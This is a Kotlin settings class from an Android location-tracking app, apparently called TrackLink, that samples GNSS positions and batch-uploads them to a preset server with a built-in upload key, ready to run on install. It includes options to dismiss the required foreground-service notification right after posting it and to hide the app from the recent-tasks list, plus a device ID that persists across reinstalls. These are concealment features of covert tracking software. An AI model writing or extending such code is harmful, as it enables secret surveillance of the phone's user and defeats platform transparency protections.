package com.kezez.tracklink.tracker

import android.content.Context
import android.os.Build
import android.provider.Settings
import org.json.JSONObject
import java.util.UUID

/**
 * 上报端配置。服务端地址与上传密钥已预置，装上即用；
 * 采样/省电参数由 App2 下发，TrackService 拉取后通过 applyServerConfig 落到这里。
 */
class Prefs(context: Context) {

    private val appContext = context.applicationContext

    private val sp = appContext.getSharedPreferences("tracklink", Context.MODE_PRIVATE)

    var serverUrl: String
        get() = sp.getString(KEY_SERVER, DEFAULT_SERVER).orEmpty()
        set(v) = sp.edit().putString(KEY_SERVER, normalizeUrl(v)).apply()

    var uploadKey: String
        get() = sp.getString(KEY_UPLOAD_KEY, DEFAULT_UPLOAD_KEY).orEmpty()
        set(v) = sp.edit().putString(KEY_UPLOAD_KEY, v.trim()).apply()

    var deviceName: String
        get() = sp.getString(KEY_NAME, "").orEmpty().ifBlank { Build.MODEL ?: "Android" }
        set(v) = sp.edit().putString(KEY_NAME, v.trim()).apply()

    /** 采样间隔（秒）：GNSS 回调最小时间间隔 */
    var intervalSec: Int
        get() = sp.getInt(KEY_INTERVAL, 30)
        set(v) = sp.edit().putInt(KEY_INTERVAL, v.coerceIn(5, 300)).apply()

    /** 最小位移（米）：挪动不足这个距离的点不记录 */
    var minDistanceM: Int
        get() = sp.getInt(KEY_MIN_DIST, 10)
        set(v) = sp.edit().putInt(KEY_MIN_DIST, v.coerceIn(0, 500)).apply()

    /** 静止多久后关闭 GNSS（分钟），0 = 不休眠 */
    var idleTimeoutMin: Int
        get() = sp.getInt(KEY_IDLE, 3)
        set(v) = sp.edit().putInt(KEY_IDLE, v.coerceIn(0, 30)).apply()

    /** 精度上限（米）：超过这个精度的点直接丢弃 */
    var maxAccuracyM: Int
        get() = sp.getInt(KEY_MAX_ACC, 50)
        set(v) = sp.edit().putInt(KEY_MAX_ACC, v.coerceIn(5, 500)).apply()

    /** 批量上报周期（秒） */
    var batchSeconds: Int
        get() = sp.getInt(KEY_BATCH, 60)
        set(v) = sp.edit().putInt(KEY_BATCH, v.coerceIn(15, 600)).apply()

    /** 心跳周期（秒） */
    var heartbeatS: Int
        get() = sp.getInt(KEY_HEARTBEAT, 300)
        set(v) = sp.edit().putInt(KEY_HEARTBEAT, v.coerceIn(60, 1800)).apply()

    /** 是否正在记录（用于进程被杀后自动恢复） */
    var tracking: Boolean
        get() = sp.getBoolean(KEY_TRACKING, false)
        set(v) = sp.edit().putBoolean(KEY_TRACKING, v).apply()

    /** 上次拉取下发配置的时间，用于节流 */
    var lastConfigFetchAt: Long
        get() = sp.getLong(KEY_CFG_FETCH, 0L)
        set(v) = sp.edit().putLong(KEY_CFG_FETCH, v).apply()

    /** 下发配置的生效时间，展示用 */
    var configUpdatedAt: Long
        get() = sp.getLong(KEY_CFG_AT, 0L)
        set(v) = sp.edit().putLong(KEY_CFG_AT, v).apply()

    /** 常驻通知静默：true = startForeground 合规发布后立即撤销通知，通知栏完全不显示（服务保持前台优先级） */
    var silentNotification: Boolean
        get() = sp.getBoolean(KEY_SILENT_NOTIF, false)
        set(v) = sp.edit().putBoolean(KEY_SILENT_NOTIF, v).apply()

    /** 隐藏最近任务：true = 最近任务列表不显示本应用卡片（运行时 AppTask.setExcludeFromRecents） */
    var hideRecents: Boolean
        get() = sp.getBoolean(KEY_HIDE_RECENTS, false)
        set(v) = sp.edit().putBoolean(KEY_HIDE_RECENTS, v).apply()

    /**
     * 设备唯一标识：优先 ANDROID_ID（同一台手机卸载重装/清数据后不变，
     * 防止查看端出现重复设备）；ANDROID_ID 不可用时退回随机 ID。
     */
    val deviceId: String
        get() {
            val existing = sp.getString(KEY_DEVICE_ID, null)
            if (existing != null) return existing
            val androidId = runCatching {
                Settings.Secure.getString(appContext.contentResolver, Settings.Secure.ANDROID_ID)
            }.getOrNull()
            val id = if (!androidId.isNullOrBlank() && androidId != "9774d56d682e549c") {
                "dev-$androidId"
            } else {
                "dev-" + UUID.randomUUID().toString().replace("-", "").take(20)
            }
            sp.edit().putString(KEY_DEVICE_ID, id).apply()
            return id
        }

    /** 当前生效参数的摘要，UI 展示用 */
    fun summary(): String =
        "采样 ${intervalSec}s · 位移 ${minDistanceM}m · 休眠 ${if (idleTimeoutMin == 0) "关" else "${idleTimeoutMin}min"} · 上报 ${batchSeconds}s"

    /**
     * 应用服务端下发的配置。返回 true 表示参数有实际变化（需要重定位/重排循环）。
     * 字段与边界和服务端 CONFIG_FIELDS 保持一致。
     */
    fun applyServerConfig(json: JSONObject): Boolean {
        fun opt(key: String, cur: Int, min: Int, max: Int): Int? {
            if (!json.has(key)) return null
            val v = json.optDouble(key, Double.NaN)
            if (!v.isFinite()) return null
            return v.coerceIn(min.toDouble(), max.toDouble()).toInt()
        }
        val interval = opt("sampleIntervalS", intervalSec, 5, 300) ?: intervalSec
        val minDist = opt("minDistanceM", minDistanceM, 0, 500) ?: minDistanceM
        val acc = opt("accuracyMaxM", maxAccuracyM, 5, 500) ?: maxAccuracyM
        val idle = opt("sleepAfterMin", idleTimeoutMin, 0, 30) ?: idleTimeoutMin
        val batch = opt("batchSeconds", batchSeconds, 15, 600) ?: batchSeconds
        val hb = opt("heartbeatS", heartbeatS, 60, 1800) ?: heartbeatS

        val changed = interval != intervalSec || minDist != minDistanceM || acc != maxAccuracyM ||
            idle != idleTimeoutMin || batch != batchSeconds || hb != heartbeatS
        intervalSec = interval
        minDistanceM = minDist
        maxAccuracyM = acc
        idleTimeoutMin = idle
        batchSeconds = batch
        heartbeatS = hb
        configUpdatedAt = System.currentTimeMillis()
        return changed
    }

    companion object {
        /** 部署时预置的服务端地址与上传密钥：App1 装上即连，无需任何手动配置 */
        // 真实密钥由 local.properties 经 BuildConfig 注入（不入库）
        const val DEFAULT_UPLOAD_KEY = BuildConfig.UPLOAD_KEY
        // 真实服务端地址由 local.properties 经 BuildConfig 注入（不入库）
        const val DEFAULT_SERVER = BuildConfig.DEFAULT_SERVER
        private const val KEY_SERVER = "server_url"
        private const val KEY_UPLOAD_KEY = "upload_key"
        private const val KEY_NAME = "device_name"
        private const val KEY_INTERVAL = "interval_sec"
        private const val KEY_MIN_DIST = "min_distance_m"
        private const val KEY_IDLE = "idle_timeout_min"
        private const val KEY_MAX_ACC = "max_accuracy_m"
        private const val KEY_BATCH = "batch_seconds"
        private const val KEY_HEARTBEAT = "heartbeat_s"
        private const val KEY_TRACKING = "tracking"
        private const val KEY_CFG_FETCH = "config_fetch_at"
        private const val KEY_CFG_AT = "config_updated_at"
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_SILENT_NOTIF = "silent_notification"
        private const val KEY_HIDE_RECENTS = "hide_recents"

        fun normalizeUrl(raw: String): String {
            var v = raw.trim()
            if (v.isEmpty()) return DEFAULT_SERVER
            if (!v.startsWith("http://") && !v.startsWith("https://")) v = "http://$v"
            return v.trimEnd('/')
        }
    }
}
